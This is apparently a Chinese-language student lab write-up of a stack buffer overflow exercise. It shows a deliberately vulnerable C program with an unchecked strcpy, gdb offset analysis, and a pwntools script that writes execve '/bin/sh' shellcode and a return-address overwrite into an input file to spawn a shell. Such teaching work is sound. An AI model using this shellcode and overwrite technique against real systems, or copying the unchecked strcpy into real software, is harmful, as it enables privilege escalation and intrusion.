第二道题，利用缓冲区溢出来实现控制流劫持攻击。首先是源代码。
```c
// buf2.c
// gcc -z execstack -o buf2 buf2.c -fno-stack-protector

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void vul(char *str) {
    char buffer[36];
    // buffer overflow
    strcpy(buffer, str);
}

int main(int argc, char **argv) {
    char str[128];
    FILE *file;
    file = fopen("attack_input2", "r");
    fread(str, sizeof(char), 128, file);
    vul(str);
    printf("Returned Properly\n");
    return 0;
}
```
梳理结构：file 打开一个文本，128 字节大小的 str 数组从文件中读取 128 个字符，这一步暂时没有漏洞。
之后进入 vul 函数中，不带长度检查的 strcpy 函数将 str 开头的字符串全部写入 36 字节长的buffer，之后函数返回。漏洞就存在于这一步，由于我们关闭了 ASLR ，每次运行程序时栈地址是相同的。可以通过构造载荷将函数返回地址覆盖到 shellcode 中，实现进程提权。
有以下思路：

1. buffer 的起始位置放置 shellcode；
2. 之后填充内容使缓冲区溢出；
3. 计算返回地址的内存位置与 buffer 起始处的距离，并将此地址改为 shellcode 地址。

那么首先我们可以通过 gdb 调试程序来观察 shellcode 和返回地址的偏移量、shellcode 首地址，返回地址和 buffer 的偏移量。
![Pwnhub-2024-05-20-23-14-05.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716218056753-b7479333-dc00-439e-ae6f-e8eb31c648de.png#averageHue=%234e5139&clientId=ud2eb6014-805a-4&from=ui&height=875&id=uc0ae2001&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2019039&status=done&style=none&taskId=u7e01dd1a-89ba-46ff-bd08-8987e8dab7e&title=&width=1555)
如上图所示 strcpy 函数调用开始，dst 和 src 地址都直接告诉了我们，可以计算出来。这段区间长度为 0x50 = 80 字节.
ebp 指针为 0xffffceb8，但注意这其实并不是主函数保存的 ebp。注意到箭头指向的地址为 0xffffcf68，表示这是上一个 ebp 值，也就是一个新旧 ebp 的覆写过程，故真正的主函数 ebp 为后者。
继续往下观察，在 strcpy 函数调用之前，存在将 ebp - 0x2c 的值赋给 edx 的汇编指令（lea edx,[ebp - 0x2c]），这就暗示了 buffer 相对于 ebp 的偏移量为 0x2c，即 buffer 起始地址为 0xffffcf68 - 0x2c = 0xffffcf3c。再加上 ebp 自身的四字节，所以 buffer 到返回地址的偏移量为 0x30。于是构造以下 payload：
```python
import sys
import struct
from pwn import *

shellcode = b'\x31\xc0' \
b'\x50' \
b'\x68\x2f\x2f\x73\x68' \
b'\x68\x2f\x62\x69\x6e' \
b'\x89\xe3' \
b'\x89\xc1' \
b'\x31\xd2' \
b'\xb0\x0b' \
b'\xcd\x80' \

offset = 0x30 # modify it
shell_addr = 0xffffcf3c # modify it with the address of shellcode
## Put the shellcode at the begin
buf = (shellcode) + (offset - len(shellcode) - 4) * b'\x90' + 2 * p32(shell_addr)

file = open('attack_input2', 'wb')
file.write(buf)
file.close()
```
拿到 shell！
![Pwnhub-2024-05-20-23-20-06.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716218419469-98df4f63-462d-490d-8854-fac60dc34291.png#averageHue=%234f5139&clientId=ud2eb6014-805a-4&from=ui&height=875&id=u5b0011cb&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2029623&status=done&style=none&taskId=u4141c3d2-dc3c-44b3-aecb-b568a3c3771&title=&width=1555)
